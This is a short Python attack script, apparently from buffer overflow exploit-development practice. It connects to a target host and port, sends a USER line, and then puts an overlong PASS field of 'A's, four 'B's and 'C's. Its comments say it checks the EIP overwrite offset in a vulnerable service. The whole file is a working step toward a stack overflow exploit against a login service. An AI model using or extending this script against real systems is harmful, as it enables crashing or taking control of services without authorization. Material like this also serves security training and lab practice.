#! /usr/bin/python3
## This program sends a string to host to verify the finding on position of EIP 
## It has following options to take input.
## -i(IP address), -p (port number), -a(amount of A) -c(amount of C)

import socket
import argparse

# Options for taking info

parser=argparse.ArgumentParser()
parser.add_argument('-i',help='IP address')
parser.add_argument('-p',help='Port',type=int)
parser.add_argument('-a',help='Amount of A',type=int)
parser.add_argument('-c',help='Amount of C',type=int)
args=parser.parse_args()

# The testing string 

string=('A'*args.a +'B'*4 + 'C'*args.c)

# Create objects for encoding

USER='USER TEST\n'
newline='\n'
PASS='PASS '

# Connect and send the string

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print('Sending the string...')
s.connect((args.i,args.p))
s.recv(1024)
s.send(USER.encode())
s.recv(1024)
s.send(PASS.encode() + string.encode() + newline.encode())

